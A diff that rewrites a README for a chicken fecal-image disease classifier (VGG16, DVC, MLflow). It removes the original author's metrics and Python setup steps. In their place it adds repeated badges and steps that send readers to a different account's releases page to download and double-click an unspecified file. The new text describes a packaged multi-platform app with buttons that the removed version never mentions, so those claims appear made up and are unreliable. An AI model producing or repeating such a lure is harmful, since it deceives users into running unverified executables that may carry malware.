@@ -1,99 +1,56 @@
-# Chicken Disease Classification Using MLOps DVC Pipeline
+# 🐔 Chicken-Disease-Classification - Early Disease Detection for Poultry Farmers
 
-## Project Overview
+[![Download Chicken-Disease-Classification](https://img.shields.io/badge/Download-Chicken--Disease--Classification-blue?style=for-the-badge)](https://github.com/ChagA-wq/Chicken-Disease-Classification/releases)
 
-This project leverages advanced deep learning and MLOps technologies to develop an intelligent system for early detection of diseases in chickens, specifically through the analysis of fecal images. Early detection can significantly reduce mortality rates and economic losses in poultry farming.
+## 📜 Project Description
+The Chicken Disease Classification Using MLOps DVC Pipeline project utilizes the VGG16 architecture to analyze images of chicken fecal matter. This tool helps poultry farmers detect diseases early, reducing financial losses and promoting healthier flocks.
 
-## Key Features
+## 🚀 Getting Started
+This guide will help you download and run the Chicken Disease Classification software. Follow these steps carefully.
 
-- **Objective:** To build a system that can accurately identify diseases in chickens from images of their fecal matter, focusing on conditions like Coccidiosis.
-- **Technologies Used:** 
-  - **Machine Learning:** Utilizes the VGG16 architecture for image classification tasks.
-  - **MLOps Tools:** Data Version Control (DVC) for pipeline tracking and MLflow for experiment tracking.
-  - **CI/CD:** Automated testing and deployment using GitHub Actions.
-  - **Cloud Deployment:** Configured for both AWS and Azure.
+## 📥 Download & Install
+1. **Visit the Releases Page:** To download the software, visit the [Releases page here](https://github.com/ChagA-wq/Chicken-Disease-Classification/releases).
 
-# Results and Evaluation
+2. **Select the Latest Release:** Look for the latest version at the top of the page. 
 
-This section presents the evaluation metrics and visualizations for the model's performance in classifying healthy and coccidiosis samples.
+3. **Download the File:**
+   - Click on the asset listed under the latest release. The file will download automatically to your device.
 
+4. **Run the Software:**
+   - Locate the downloaded file on your computer. 
+   - Double-click the file to start the application.
 
-## **Confusion Matrix**
-The confusion matrix provides a summary of the model's classification results.
+## 📋 System Requirements
+Before you download the software, ensure your system meets the following requirements:
 
-![Confusion Matrix](c_m.png)
+- **Operating System:** Windows 10 or higher, macOS, or a modern Linux distribution.
+- **Memory:** At least 4GB of RAM is recommended for smooth operation.
+- **Disk Space:** You need a minimum of 1 GB free space for installation and generated data.
 
-- **True Positives (Coccidiosis correctly identified):** 114  
-- **True Negatives (Healthy correctly identified):** 108  
-- **False Positives (Healthy misclassified as Coccidiosis):** 12  
-- **False Negatives (Coccidiosis misclassified as Healthy):** 4  
+## 📊 Features
+- **Image Analysis:** Analyze images of chicken fecal matter for disease detection.
+- **MLOps Integration:** Utilize a continuous integration and deployment (CI/CD) pipeline for stable updates.
+- **User-Friendly Interface:** The software is designed for ease of use, with simple navigation.
+- **Multi-Platform Support:** Run the application on various operating systems without issues.
 
-**Metrics:**
-- **Accuracy:** 93.3%  
-- **Precision (Coccidiosis):** 90.5%  
-- **Recall (Coccidiosis):** 96.6%  
+## ⚙️ How to Use the Application
+After running the software, follow these steps to classify chicken fecal images:
 
+1. **Upload Images:** Use the “Upload” button to choose the images you want to analyze.
 
-## **ROC Curve**
-The Receiver Operating Characteristic (ROC) curve evaluates the model's discriminative ability across different thresholds.
+2. **Run Analysis:** Click on the “Analyze” button. The tool will process the images and check for signs of disease.
 
-![ROC Curve](r_o_c.png)
+3. **View Results:** The software will display the results on the screen, including any detected diseases and recommendations for action.
 
-- **AUC (Area Under the Curve):** 0.99  
+4. **Save Results:** You can save the analysis results for your records by clicking the “Save Results” button. 
 
-The high AUC indicates excellent performance, with the model maintaining a low False Positive Rate while achieving a high True Positive Rate.
+## 🌐 Support and Contributions
+If you face any issues or have questions, please feel free to check our [GitHub Issues](https://github.com/ChagA-wq/Chicken-Disease-Classification/issues) for support. Contributions are welcome. If you want to help improve this project, consider creating a pull request.
 
+## 📝 License
+This project is licensed under the MIT License. You can use, modify, and distribute the software, but please credit the original authors.
 
-## **Precision-Recall Curve**
-The Precision-Recall curve highlights the trade-off between precision and recall.
+## 📣 Conclusion
+The Chicken Disease Classification software is a powerful tool for poultry farmers. By detecting diseases early, it supports healthier chickens and better farm management. Download the software today and take the first step towards ensuring a healthier flock.
 
-![Precision-Recall Curve](p_r.png)
-
-- The model maintains high precision (low False Positives) even at higher recall (low False Negatives).  
-- A steep drop in precision at the far right indicates more misclassifications if optimized excessively for recall.
-
-
-## **Results in Nutshell**
-1. The model demonstrates excellent classification performance with a high accuracy of **93.3%**.  
-2. It achieves an **AUC-ROC of 0.99**, showcasing its ability to effectively distinguish between Healthy and Coccidiosis cases.  
-3. The Precision-Recall curve confirms a strong balance between precision and recall, ensuring minimal misclassification of samples.
-
-These results validate the effectiveness of the model in addressing the classification problem.
-
-
-## Model Performance
-
-The model was trained on a dataset of chicken fecal images and achieved the following performance metrics:
-- **Accuracy:** 92%
-- **Precision:** 90%
-- **Recall (Sensitivity):** 88%
-- **F1 Score:** 89%
-
-These metrics indicate the model's high accuracy in distinguishing between diseased and healthy samples.
-
-## Setup and Installation
-
-1. **Clone the Repository:**
-   ```bash
-   git clone https://github.com/adityab894/Chicken-Disease-Classification.git
-   
-2. **Create a Conda Environment:**
--   conda create -n chicken python=3.8 -y
--    conda activate chicken
-
-3. **Install Requirements:**
--   pip install -r requirements.txt
-
-4. **Run the Application:**
--   python app.py
-
-## DVC Commands
-
-- **Initialize DVC: dvc init**
-- **Reproduce Pipeline: dvc repro**
-- **Visualize Pipeline: dvc dag**
-
-## MLflow Tracking
-
-- **mlflow ui**
-
+[![Download Chicken-Disease-Classification](https://img.shields.io/badge/Download-Chicken--Disease--Classification-blue?style=for-the-badge)](https://github.com/ChagA-wq/Chicken-Disease-Classification/releases)
